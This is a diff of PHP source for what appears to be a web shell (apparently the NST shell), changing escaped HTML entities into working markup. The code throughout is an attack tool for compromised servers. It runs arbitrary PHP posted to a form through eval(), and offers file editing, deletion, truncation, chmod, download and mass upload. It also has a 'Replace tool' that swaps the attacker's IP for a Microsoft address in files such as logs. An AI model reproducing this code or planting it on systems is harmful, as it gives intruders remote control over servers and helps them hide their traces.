-echo "&lt;form method=post&gt;&lt;b&gt;md5:&lt;/b&gt;&lt;br&gt;&lt;input name=md5 size=30&gt;
-&lt;Br&gt;
-md5 online encoder/decoder (brutforce) (php) - [&lt;a href=http://nst.void.ru/?q=releases&download=4&gt;DOWNLOAD&lt;/a&gt;]
-&lt;/form&gt;
+echo "<form method=post><b>md5:</b><br><input name=md5 size=30>
+<Br>
+md5 online encoder/decoder (brutforce) (php) - [<a href=http://nst.void.ru/?q=releases&download=4>DOWNLOAD</a>]
+</form>
 ";
 @$md5=@$_POST['md5'];
-if(@$_POST['md5']){ echo "md5:&lt;br&gt;&lt;textarea rows=1 cols=113&gt;".md5($md5)."&lt;/textarea&gt;";}
-echo "&lt;br&gt;
-&lt;form method=post&gt;&lt;b&gt;base64 e/d:&lt;/b&gt;&lt;br&gt;&lt;input name=base64 size=30&gt;&lt;/form&gt;&lt;br&gt;";
+if(@$_POST['md5']){ echo "md5:<br><textarea rows=1 cols=113>".md5($md5)."</textarea>";}
+echo "<br>
+<form method=post><b>base64 e/d:</b><br><input name=base64 size=30></form><br>";
 if(@$_POST['base64']){
 @$base64=$_POST['base64'];
 echo "
-&lt;b&gt;Encode: &lt;br&gt;&lt;textarea rows=15 cols=113&gt;".base64_encode($base64)."&lt;/textarea&gt;&lt;br&gt;
-Decode:&lt;/b&gt; &lt;br&gt;&lt;textarea rows=15 cols=113&gt;".base64_decode($base64)."&lt;/textarea&gt;&lt;br&gt;";}
-echo "&lt;br&gt;
-&lt;form method=post&gt;&lt;b&gt;DES:&lt;/b&gt;&lt;br&gt;&lt;input name=des size=30&gt;&lt;br&gt;
-John The Ripper [&lt;a href=http://www.openwall.com/john/ target=_blank&gt;Web&lt;/a&gt;]&lt;/form&gt;&lt;br&gt;";
+<b>Encode: <br><textarea rows=15 cols=113>".base64_encode($base64)."</textarea><br>
+Decode:</b> <br><textarea rows=15 cols=113>".base64_decode($base64)."</textarea><br>";}
+echo "<br>
+<form method=post><b>DES:</b><br><input name=des size=30><br>
+John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>";
 if(@$_POST['des']){
 @$des=@$_POST['des'];
-echo "&lt;b&gt;Des:&lt;/b&gt; &lt;br&gt;&lt;textarea rows=15 cols=113&gt;".crypt($des)."&lt;/textarea&gt;";}
+echo "<b>Des:</b> <br><textarea rows=15 cols=113>".crypt($des)."</textarea>";}
 
 print "
-&lt;b&gt;eval:&lt;/b&lt;br&gt;
+<b>eval:</b<br>
 (example: print \"Hello World\";)
-&lt;form method=post&gt;
-&lt;font color=red&gt;&lt;b&gt;<?&lt;/b&gt;&lt;br&gt;
-&lt;textarea name=eval rows=15 cols=113&gt;&lt;/textarea&gt;&lt;br&gt;
-&lt;b&gt;?>&lt;/b&gt;&lt;/font&gt;&lt;br&gt;
-&lt;input type=submit value=Run style='width:150px;'&gt;
-&lt;/form&gt;&lt;br&gt;
+<form method=post>
+<font color=red><b><?</b><br>
+<textarea name=eval rows=15 cols=113></textarea><br>
+<b>?></b></font><br>
+<input type=submit value=Run style='width:150px;'>
+</form><br>
 ";
 
 function eval_sl($editf){
@@ -1766,16 +1766,16 @@ return $editf;
 
 
 if($_POST['eval']){
-print "&lt;b&gt;RESULT:&lt;br&gt;&lt;br&gt;&lt;/b&gt;";
+print "<b>RESULT:<br><br></b>";
 eval(eval_sl($_POST['eval']));
-print "&lt;br&gt;&lt;br&gt;";
+print "<br><br>";
 
-print "&lt;font color=green&gt;&lt;b&gt;PHP:&lt;/b&gt;&lt;br&gt;\r\n\r\n";
+print "<font color=green><b>PHP:</b><br>\r\n\r\n";
 print "<?\r\n";
-print "&lt;br&gt;";
+print "<br>";
 print htmlspecialchars(eval_sl(($_POST['eval'])));
-print "&lt;br&gt;";
-print "?>\r\n\r\n&lt;/font&gt;&lt;br&gt;&lt;br&gt;";
+print "<br>";
+print "?>\r\n\r\n</font><br><br>";
 
 }
 
@@ -1789,17 +1789,17 @@ $e=$_GET['e'];
 @$de=$d."/".$e;
 $de=str_replace("//","/",$de);
 $e=@$e;
-echo "[&lt;a href='$php_self?d=$d&del_f=1&wich_f=$e'&gt;Delete&lt;/a&gt;] [&lt;a href='$php_self?d=$d&ef=$e&edit=1'&gt;Edit&lt;/a&gt;] [&lt;a href='$php_self?d=$d&e=$e&clean=1'&gt;Filesize to 0 byte&lt;/a&gt;] [&lt;a href='$php_self?d=$d&e=$e&replace=1'&gt;Replace text in file&lt;/a&gt;] [&lt;a href='$php_self?d=$d&download=$e'&gt;Download&lt;/a&gt;] [&lt;a href='$php_self?d=$d&rename=1&wich_f=$e'&gt;Rename&lt;/a&gt;] [&lt;a href='$php_self?d=$d&chmod=1&wich_f=$e'&gt;CHMOD&lt;/a&gt;] [&lt;a href='$php_self?d=$d&ccopy_to=$e'&gt;Copy&lt;/a&gt;]&lt;br&gt;";
+echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
 echo "
-Replace tool:&lt;br&gt;
-(You can replace any text)&lt;br&gt;
-File: $de&lt;br&gt;
-&lt;form method=post&gt;
-1. Your ip.&lt;br&gt;
-2. microsoft.com ip :)&lt;br&gt;
-Replace this &lt;input name=thisX size=30 value=$ip&gt; by this &lt;input name=bythis size=30 value=207.46.245.156&gt;
-&lt;input type=submit name=doit value=Replace&gt;
-&lt;/form&gt;
+Replace tool:<br>
+(You can replace any text)<br>
+File: $de<br>
+<form method=post>
+1. Your ip.<br>
+2. microsoft.com ip :)<br>
+Replace this <input name=thisX size=30 value=$ip> by this <input name=bythis size=30 value=207.46.245.156>
+<input type=submit name=doit value=Replace>
+</form>
 ";
 
 if(@$_POST['doit']){
@@ -1812,8 +1812,8 @@ $rpl = @fread ($fd, @filesize ($filename));
 $re=str_replace("$thisX","$bythis",$rpl);
 $x=@fopen("$d/$e","w");
 @fwrite($x,"$re");
-echo "&lt;br&gt;&lt;center&gt;$thisX Replaced by $bythis&lt;br&gt;
-[&lt;a href='$php_self?d=$d&e=$e'&gt;VIew file&lt;/a&gt;]&lt;br&gt;&lt;br&gt;&lt;Br&gt;";
+echo "<br><center>$thisX Replaced by $bythis<br>
+[<a href='$php_self?d=$d&e=$e'>VIew file</a>]<br><br><Br>";
 
 }
 echo $copyr;
@@ -1821,16 +1821,16 @@ exit;}
 
 
 if(@$_GET['t']=="upload"){
-echo "&lt;br&gt;
-&lt;a href='$php_self?d=$d&t=massupload'&gt;* Mass upload *&lt;/a&gt;&lt;br&gt;
-File upload:&lt;br&gt;
-&lt;form enctype=\"multipart/form-data\" method=post&gt;
-&lt;input type=file name=text size=50&gt;&lt;br&gt;
-&lt;input name=where size=52 value='$d'&gt;&lt;br&gt;
-New file name:&lt;br&gt;
-&lt;input name=newf size=30 autocomplete=off&gt; (if empty, it will be default)&lt;br&gt;
-&lt;input type=submit value=Upload name=uploadf&gt;
-&lt;/form&gt;&lt;br&gt;
+echo "<br>
+<a href='$php_self?d=$d&t=massupload'>* Mass upload *</a><br>
+File upload:<br>
+<form enctype=\"multipart/form-data\" method=post>
+<input type=file name=text size=50><br>
+<input name=where size=52 value='$d'><br>
+New file name:<br>
+<input name=newf size=30 autocomplete=off> (if empty, it will be default)<br>
+<input type=submit value=Upload name=uploadf>
+</form><br>
 ";
 
 if(@$_POST['uploadf']){
@@ -1841,29 +1841,29 @@ if($newf==""){$newf=$_FILES['text']['name'];}else{$newf=$newf;}
 $uploadfile = "$where/".$newf;
 if (@move_uploaded_file(@$_FILES['text']['tmp_name'], $uploadfile)) {
 $uploadfile=str_replace("//","/",$uploadfile);
-echo "&lt;i&gt;&lt;br&gt;Uploaded to $uploadfile&lt;/i&gt;&lt;br&gt;";
+echo "<i><br>Uploaded to $uploadfile</i><br>";
 }else{
-echo "&lt;i&gt;&lt;br&gt;Error&lt;/i&gt;&lt;br&gt;";}
+echo "<i><br>Error</i><br>";}
 }
 }
 
 if(@$_GET['t']=="massupload"){
 echo "
-Mass upload:&lt;br&gt;
-&lt;form enctype=\"multipart/form-data\" method=post&gt;
-&lt;input type=file name=text1 size=43&gt; &lt;input type=file name=text11 size=43&gt;&lt;br&gt;
-&lt;input type=file name=text2 size=43&gt; &lt;input type=file name=text12 size=43&gt;&lt;br&gt;
-&lt;input type=file name=text3 size=43&gt; &lt;input type=file name=text13 size=43&gt;&lt;br&gt;
-&lt;input type=file name=text4 size=43&gt; &lt;input type=file name=text14 size=43&gt;&lt;br&gt;
-&lt;input type=file name=text5 size=43&gt; &lt;input type=file name=text15 size=43&gt;&lt;br&gt;
-&lt;input type=file name=text6 size=43&gt; &lt;input type=file name=text16 size=43&gt;&lt;br&gt;
-&lt;input type=file name=text7 size=43&gt; &lt;input type=file name=text17 size=43&gt;&lt;br&gt;
-&lt;input type=file name=text8 size=43&gt; &lt;input type=file name=text18 size=43&gt;&lt;br&gt;
-&lt;input type=file name=text9 size=43&gt; &lt;input type=file name=text19 size=43&gt;&lt;br&gt;
-&lt;input type=file name=text10 size=43&gt; &lt;input type=file name=text20 size=43&gt;&lt;br&gt;
-&lt;input name=where size=43 value='$d'&gt;&lt;br&gt;
-&lt;input type=submit value=Upload name=massupload&gt;
-&lt;/form&gt;&lt;br&gt;";
+Mass upload:<br>
+<form enctype=\"multipart/form-data\" method=post>
+<input type=file name=text1 size=43> <input type=file name=text11 size=43><br>
+<input type=file name=text2 size=43> <input type=file name=text12 size=43><br>
+<input type=file name=text3 size=43> <input type=file name=text13 size=43><br>
+<input type=file name=text4 size=43> <input type=file name=text14 size=43><br>
+<input type=file name=text5 size=43> <input type=file name=text15 size=43><br>
+<input type=file name=text6 size=43> <input type=file name=text16 size=43><br>
+<input type=file name=text7 size=43> <input type=file name=text17 size=43><br>
+<input type=file name=text8 size=43> <input type=file name=text18 size=43><br>
+<input type=file name=text9 size=43> <input type=file name=text19 size=43><br>
+<input type=file name=text10 size=43> <input type=file name=text20 size=43><br>
+<input name=where size=43 value='$d'><br>
+<input type=submit value=Upload name=massupload>
+</form><br>";
 
 if(@$_POST['massupload']){
 $where=@$_POST['where'];
@@ -1889,64 +1889,64 @@ $uploadfile19 = "$where/".@$_FILES['text19']['name'];
 $uploadfile20 = "$where/".@$_FILES['text20']['name'];
 if (@move_uploaded_file(@$_FILES['text1']['tmp_name'], $uploadfile1)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile1&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile1</i><br>";}
 if (@move_uploaded_file(@$_FILES['text2']['tmp_name'], $uploadfile2)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile2&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile2</i><br>";}
 if (@move_uploaded_file(@$_FILES['text3']['tmp_name'], $uploadfile3)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile3&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile3</i><br>";}
 if (@move_uploaded_file(@$_FILES['text4']['tmp_name'], $uploadfile4)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile4&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile4</i><br>";}
 if (@move_uploaded_file(@$_FILES['text5']['tmp_name'], $uploadfile5)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile5&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile5</i><br>";}
 if (@move_uploaded_file(@$_FILES['text6']['tmp_name'], $uploadfile6)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile6&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile6</i><br>";}
 if (@move_uploaded_file(@$_FILES['text7']['tmp_name'], $uploadfile7)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile7&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile7</i><br>";}
 if (@move_uploaded_file(@$_FILES['text8']['tmp_name'], $uploadfile8)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile8&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile8</i><br>";}
 if (@move_uploaded_file(@$_FILES['text9']['tmp_name'], $uploadfile9)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile9&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile9</i><br>";}
 if (@move_uploaded_file(@$_FILES['text10']['tmp_name'], $uploadfile10)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile10&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile10</i><br>";}
 if (@move_uploaded_file(@$_FILES['text11']['tmp_name'], $uploadfile11)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile11&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile11</i><br>";}
 if (@move_uploaded_file(@$_FILES['text12']['tmp_name'], $uploadfile12)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile12&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile12</i><br>";}
 if (@move_uploaded_file(@$_FILES['text13']['tmp_name'], $uploadfile13)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile13&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile13</i><br>";}
 if (@move_uploaded_file(@$_FILES['text14']['tmp_name'], $uploadfile14)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile14&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile14</i><br>";}
 if (@move_uploaded_file(@$_FILES['text15']['tmp_name'], $uploadfile15)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile15&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile15</i><br>";}
 if (@move_uploaded_file(@$_FILES['text16']['tmp_name'], $uploadfile16)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile16&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile16</i><br>";}
 if (@move_uploaded_file(@$_FILES['text17']['tmp_name'], $uploadfile17)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile17&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile17</i><br>";}
 if (@move_uploaded_file(@$_FILES['text18']['tmp_name'], $uploadfile18)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile18&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile18</i><br>";}
 if (@move_uploaded_file(@$_FILES['text19']['tmp_name'], $uploadfile19)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile19&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile19</i><br>";}
 if (@move_uploaded_file(@$_FILES['text20']['tmp_name'], $uploadfile20)) {
 $where=str_replace("\\\\","\\",$where);
-echo "&lt;i&gt;Uploaded to $uploadfile20&lt;/i&gt;&lt;br&gt;";}
+echo "<i>Uploaded to $uploadfile20</i><br>";}
 }
 echo $copyr;
 exit;}
@@ -1954,13 +1954,13 @@ exit;}
 if(@$_GET['yes']=="yes"){
 $d=@$_GET['d']; $e=@$_GET['e'];
 unlink($d."/".$e);
-$delresult="Success $d/$e deleted &lt;meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?d=$d\"&gt;";
+$delresult="Success $d/$e deleted <meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?d=$d\">";
 }
 if(@$_GET['clean']=="1"){
 @$e=$_GET['e'];
 $x=fopen("$d/$e","w");
 fwrite($x,"");
-echo "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=".@$e."\"&gt;";
+echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=".@$e."\">";
 exit;
 }
 
@@ -1970,7 +1970,7 @@ $d=@$_GET['d'];
 $e=@$_GET['e'];
 $pinf=pathinfo($e);
 if(in_array(".".@$pinf['extension'],$images)){
-echo "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$e&img=1\"&gt;";
+echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$e&img=1\">";
 exit;}
 $filename="$d/$e";
 $fd = @fopen ($filename, "r");
@@ -1979,34 +1979,34 @@ $c=htmlspecialchars($c);
 $de=$d."/".$e;
 $de=str_replace("//","/",$de);
 if(is_file($de)){
-if(!is_writable($de)){echo "&lt;font color=red&gt;READ ONLY&lt;/font&gt;&lt;br&gt;";}}
-echo "[&lt;a href='$php_self?d=$d&del_f=1&wich_f=$e'&gt;Delete&lt;/a&gt;] [&lt;a href='$php_self?d=$d&ef=$e&edit=1'&gt;Edit&lt;/a&gt;] [&lt;a href='$php_self?d=$d&e=$e&clean=1'&gt;Filesize to 0 byte&lt;/a&gt;] [&lt;a href='$php_self?d=$d&e=$e&replace=1'&gt;Replace text in file&lt;/a&gt;] [&lt;a href='$php_self?d=$d&download=$e'&gt;Download&lt;/a&gt;] [&lt;a href='$php_self?d=$d&rename=1&wich_f=$e'&gt;Rename&lt;/a&gt;] [&lt;a href='$php_self?d=$d&chmod=1&wich_f=$e'&gt;CHMOD&lt;/a&gt;] [&lt;a href='$php_self?d=$d&ccopy_to=$e'&gt;Copy&lt;/a&gt;]&lt;br&gt;";
+if(!is_writable($de)){echo "<font color=red>READ ONLY</font><br>";}}
+echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
 echo "
-File contents:&lt;br&gt;
+File contents:<br>
 $de
-&lt;br&gt;
-&lt;table width=100% border=1 cellpadding=0 cellspacing=0&gt;
-&lt;tr&gt;&lt;td&gt;&lt;pre&gt;
+<br>
+<table width=100% border=1 cellpadding=0 cellspacing=0>
+<tr><td><pre>
 $c
 
-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;/table&gt;
+</pre></td></tr>
+</table>
 
 ";
 
 if(@$_GET['delete']=="1"){
 $delete=$_GET['delete'];
 echo "
-DELETE: Are you sure?&lt;br&gt;
-&lt;a href=\"$php_self?d=$d&e=$e&delete=".@$delete."&yes=yes\"&gt;Yes&lt;/a&gt; || &lt;a href='$php_self?no=1'&gt;No&lt;/a&gt;
-&lt;br&gt;
+DELETE: Are you sure?<br>
+<a href=\"$php_self?d=$d&e=$e&delete=".@$delete."&yes=yes\">Yes</a> || <a href='$php_self?no=1'>No</a>
+<br>
 ";
 if(@$_GET['yes']=="yes"){
 @$d=$_GET['d']; @$e=$_GET['e'];
 echo $delresult;
 }
 if(@$_GET['no']){
-echo "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$e\"&gt;
+echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$e\">
 ";
 }
 
@@ -2021,8 +2021,8 @@ if(@$_GET['edit']=="1"){
 @$ef=$_GET['ef'];
 $e=$ef;
 if(is_file($d."/".$ef)){
-if(!is_writable($d."/".$ef)){echo "&lt;font color=red&gt;READ ONLY&lt;/font&gt;&lt;br&gt;";}}
-echo "[&lt;a href='$php_self?d=$d&del_f=1&wich_f=$e'&gt;Delete&lt;/a&gt;] [&lt;a href='$php_self?d=$d&ef=$e&edit=1'&gt;Edit&lt;/a&gt;] [&lt;a href='$php_self?d=$d&e=$e&clean=1'&gt;Filesize to 0 byte&lt;/a&gt;] [&lt;a href='$php_self?d=$d&e=$e&replace=1'&gt;Replace text in file&lt;/a&gt;] [&lt;a href='$php_self?d=$d&download=$e'&gt;Download&lt;/a&gt;] [&lt;a href='$php_self?d=$d&rename=1&wich_f=$e'&gt;Rename&lt;/a&gt;] [&lt;a href='$php_self?d=$d&chmod=1&wich_f=$e'&gt;CHMOD&lt;/a&gt;] [&lt;a href='$php_self?d=$d&ccopy_to=$e'&gt;Copy&lt;/a&gt;]&lt;br&gt;";
+if(!is_writable($d."/".$ef)){echo "<font color=red>READ ONLY</font><br>";}}
+echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
 $filename="$d/$ef";
 $fd = @fopen ($filename, "r");
 $c = @fread ($fd, @filesize ($filename));
@@ -2030,16 +2030,16 @@ $c=htmlspecialchars($c);
 $de=$d."/".$ef;
 $de=str_replace("//","/",$de);
 echo "
-Edit:&lt;br&gt;
-$de&lt;br&gt;";
+Edit:<br>
+$de<br>";
 
 if(!@$_POST['save']){
 print "
-&lt;form method=post&gt;
-&lt;input name=filename value='$d/$ef'&gt;
-&lt;textarea cols=143 rows=30 name=editf&gt;$c&lt;/textarea&gt;
-&lt;br&gt;
-&lt;input type=submit name=save value='Save changes'&gt;&lt;/form&gt;&lt;br&gt;
+<form method=post>
+<input name=filename value='$d/$ef'>
+<textarea cols=143 rows=30 name=editf>$c</textarea>
+<br>
+<input type=submit name=save value='Save changes'></form><br>
 ";
 }
 if(@$_POST['save']){
@@ -2051,9 +2051,9 @@ $editf=stripslashes($editf);
 
 $f=fopen($filename,"w+");
 fwrite($f,"$editf");
-echo "&lt;br&gt;
-&lt;b&gt;File edited.&lt;/b&gt;
-&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$ef\"&gt;";
+echo "<br>
+<b>File edited.</b>
+<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$ef\">";
 exit;
 }
 echo $copyr;
@@ -2063,12 +2063,12 @@ exit;
 
 
 echo"
-&lt;table width=100% cellpadding=1 cellspacing=0 class=hack&gt;
-&lt;tr&gt;&lt;td bgcolor=#519A00&gt;&lt;center&gt;&lt;b&gt;Filename&lt;/b&gt;&lt;/td&gt;&lt;td bgcolor=#519A00&gt;&lt;center&gt;&lt;b&gt;Tools&lt;/b&gt;&lt;/td&gt;&lt;td bgcolor=#519A00&gt;&lt;b&gt;Size&lt;/b&gt;&lt;/td&gt;&lt;td bgcolor=#519A00&gt;&lt;center&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td bgcolor=#519A00&gt;&lt;b&gt;Perms&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;
+<table width=100% cellpadding=1 cellspacing=0 class=hack>
+<tr><td bgcolor=#519A00><center><b>Filename</b></td><td bgcolor=#519A00><center><b>Tools</b></td><td bgcolor=#519A00><b>Size</b></td><td bgcolor=#519A00><center><b>Owner/Group</b></td><td bgcolor=#519A00><b>Perms</b></td></tr>
 ";
 $dirs=array();
 $files=array();
-$dh = @opendir($d) or die("&lt;table width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;center&gt;Permission Denied or Folder/Disk does not exist&lt;/center&gt;&lt;br&gt;$copyr&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;");
+$dh = @opendir($d) or die("<table width=100%><tr><td><center>Permission Denied or Folder/Disk does not exist</center><br>$copyr</td></tr></table>");
 while (!(($file = readdir($dh)) === false)) {
 if ($file=="." || $file=="..") continue;
 if (@is_dir("$d/$file")) {
@@ -2119,7 +2119,7 @@ return $info;
 }
 
 
-for($i=0; $i&lt;count($dirs); $i++){
+for($i=0; $i<count($dirs); $i++){
 
 $perms = @fileperms($d."/".$dirs[$i]);
 $owner = @fileowner($d."/".$dirs[$i]);
@@ -2134,12 +2134,12 @@ $group=$groupinfo['name'];
 }
 $info=perm($perms);
 if($i%2){$color="#D7FFA8";}else{$color="#D1D1D1";}
-$linkd="&lt;a href='$php_self?d=$d/$dirs[$i]'&gt;$dirs[$i]&lt;/a&gt;";
+$linkd="<a href='$php_self?d=$d/$dirs[$i]'>$dirs[$i]</a>";
 $linkd=str_replace("//","/",$linkd);
-echo "&lt;tr&gt;&lt;td bgcolor=$color&gt;&lt;font face=wingdings size=2&gt;0&lt;/font&gt; $linkd&lt;/td&gt;&lt;td bgcolor=$color&gt;&lt;center&gt;&lt;font color=blue&gt;DIR&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=$color&gt;&nbsp;&lt;/td&gt;&lt;td bgcolor=$color&gt;&lt;center&gt;$owner/$group&lt;/td&gt;&lt;td bgcolor=$color&gt;$info&lt;/td&gt;&lt;/tr&gt;";
+echo "<tr><td bgcolor=$color><font face=wingdings size=2>0</font> $linkd</td><td bgcolor=$color><center><font color=blue>DIR</font></td><td bgcolor=$color>&nbsp;</td><td bgcolor=$color><center>$owner/$group</td><td bgcolor=$color>$info</td></tr>";
 }
 
-for($i=0; $i&lt;count($files); $i++){
+for($i=0; $i<count($files); $i++){
 
 $size=@filesize($d."/".$files[$i]);
 $perms = @fileperms($d."/".$files[$i]);
@@ -2156,18 +2156,18 @@ $group=$groupinfo['name'];
 $info=perm($perms);
 if($i%2){$color="#D1D1D1";}else{$color="#D7FFA8";}
 
-if ($size &lt; 1024){$siz=$size.' b';
+if ($size < 1024){$siz=$size.' b';
 }else{
-if ($size &lt; 1024*1024){$siz=number_format(($size/1024), 2, '.', '').' kb';}else{
-if ($size &lt; 1000000000){$siz=number_format($size/(1024*1024), 2, '.', '').' mb';}else{
-if ($size &lt; 1000000000000){$siz=number_format($size/(1024*1024*1024), 2, '.', '').' gb';}
+if ($size < 1024*1024){$siz=number_format(($size/1024), 2, '.', '').' kb';}else{
+if ($size < 1000000000){$siz=number_format($size/(1024*1024), 2, '.', '').' mb';}else{
+if ($size < 1000000000000){$siz=number_format($size/(1024*1024*1024), 2, '.', '').' gb';}
 }}}
-echo "&lt;tr&gt;&lt;td bgcolor=$color&gt;&lt;font face=wingdings size=3&gt;2&lt;/font&gt; &lt;a href='$php_self?d=$d&e=$files[$i]'&gt;$files[$i]&lt;/a&gt;&lt;/td&gt;&lt;td bgcolor=$color&gt;&lt;center&gt;&lt;a href=\"javascript:ShowOrHide('$i','')\"&gt;[options]&lt;/a&gt;&lt;div id='$i' style='display:none;z-index:1;' &gt;&lt;a href='$php_self?d=$d&ef=$files[$i]&edit=1' title='Edit $files[$i]'&gt;&lt;b&gt;Edit&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href='$php_self?d=$d&del_f=1&wich_f=$files[$i]' title='Delete $files[$i]'&gt;&lt;b&gt;Delete&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href='$php_self?d=$d&chmod=1&wich_f=$files[$i]' title='chmod $files[$i]'&gt;&lt;b&gt;CHMOD&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href='$php_self?d=$d&rename=1&wich_f=$files[$i]' title='Rename $files[$i]'&gt;&lt;b&gt;Rename&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href='$php_self?d=$d&download=$files[$i]' title='Download $files[$i]'&gt;&lt;b&gt;Download&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href='$php_self?d=$d&ccopy_to=$files[$i]' title='Copy $files[$i] to?'&gt;&lt;b&gt;Copy&lt;/b&gt;&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;&lt;td bgcolor=$color&gt;$siz&lt;/td&gt;&lt;td bgcolor=$color&gt;&lt;center&gt;$owner/$group&lt;/td&gt;&lt;td bgcolor=$color&gt;$info&lt;/td&gt;&lt;/tr&gt;";
